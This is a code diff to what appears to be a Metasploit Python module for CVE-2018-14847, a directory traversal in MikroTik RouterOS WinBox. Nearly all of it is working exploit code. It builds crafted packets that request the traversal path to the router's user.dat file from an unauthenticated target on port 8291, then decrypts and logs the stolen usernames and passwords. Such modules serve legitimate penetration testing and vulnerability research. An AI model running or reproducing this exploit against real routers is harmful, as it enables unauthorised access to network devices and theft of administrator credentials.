@@ -18,8 +18,9 @@ from metasploit import module
 metadata = {
     'name': 'Mikrotik Winbox Arbitrary File Read',
     'description': '''
-        Python communication with msfconsole.
-    ''',
+        MikroTik RouterOS (bugfix) 6.30.1-6.40.7, (current) 6.29-6.42, (RC) 6.29rc1-6.43rc3 allows unauthenticated
+        remote attackers to read arbitrary files through a directory traversal through the WinBox interface
+        (typically port 8291).''',
     'authors': [
         'mosajjal', # PoC
         'h00die' # msf port
@@ -29,16 +30,18 @@ metadata = {
     'references': [
         {'type': 'url', 'ref': 'https://github.com/BasuCert/WinboxPoC'},
         {'type': 'url', 'ref': 'https://blog.n0p.me/2018/05/2018-05-21-winbox-bug-dissection/'},
-        {'type': 'cve', 'ref': '2018-14847'}
+        {'type': 'url', 'ref': 'https://blog.mikrotik.com/security/winbox-vulnerability.html'},
+        {'type': 'cve', 'ref': '2018-14847'},
+        {'type': 'edb', 'ref': '45578'}
     ],
     'type': 'single_scanner',
     'options': {
         'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
-        'rport': {'type': 'port', 'description': 'Target port', 'required': True, 'default': 8291}
+        'rport': {'type': 'port', 'description': 'Target port', 'required': True, 'default': 8291},
     }
 }
 
-# direct port from @mosajjal's repo, extract_user.py
+# direct port from @mosajjal's repo, extract_user.py, replacing prints with logging
 def decrypt_password(user, pass_enc):
     key = hashlib.md5(user + b"283i4jfkai3389").digest()
 
@@ -79,9 +82,11 @@ def get_pair(data):
 
 def dump(data):
     user_pass = get_pair(data)
+    user_pass = set(user_pass) # unique it to avoid duplicates
     for u, p in user_pass:
-        loggin.info('Extracted Username: "{}" and passowrd "{}"'.format(u,p))
+        logging.info('Extracted Username: "{}" and password "{}"'.format(u,p))
 
+# end of direct port
 
 def run(args):
     module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
@@ -89,24 +94,23 @@ def run(args):
         logging.error('Module dependency (requests) is missing, cannot continue')
         return
 
+    # full file to pull
+    file = b'/////./..//////./..//////./../flash/rw/store/user.dat'
+
     # hello packet, should get a session ID in response
+    # also contains the request for the file
     # session IDs are integers, incremented
     a = [0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
          0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
-         0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
-         0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
-         0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
-         0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
-         0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
-         0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
-         0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
-         0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
-         0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
-         0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
-         0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
-         0x00, 0x00]
+         0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21]
+    a += [len(file)]
+    a += list(bytearray(file))
+    a += [0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
+         0x08, 0x00, 0x00, 0x00]
+    a += [0x01, 0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00, 0x00,
+         0x02, 0x00, 0x00, 0x00]
 
-    # file request
+    # 2nd request to retrieve the file
     b = [0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
          0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
          0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
@@ -120,7 +124,7 @@ def run(args):
     s = socket.socket()
     s.settimeout(3)
     try:
-        s.connect((args['rhost'], args['rport']))
+        s.connect((args['rhost'], int(args['rport'])))
     except Exception as e:
         logging.error("Connection error: {}".format(e))
         return
@@ -143,11 +147,11 @@ def run(args):
     b[19] = session_id
 
     #Send the edited response
+    logging.info("Requesting user database through exploit")
     s.send(b)
     d = bytearray(s.recv(1024))
 
     #Get results
-    logging.info("Connected to {}:{}".format(args['rhost'], args['rport']))
     if len(d[55:]) > 25:
         logging.info('Exploit successful, attempting to extract usernames & passwords')
         dump(d[55:])
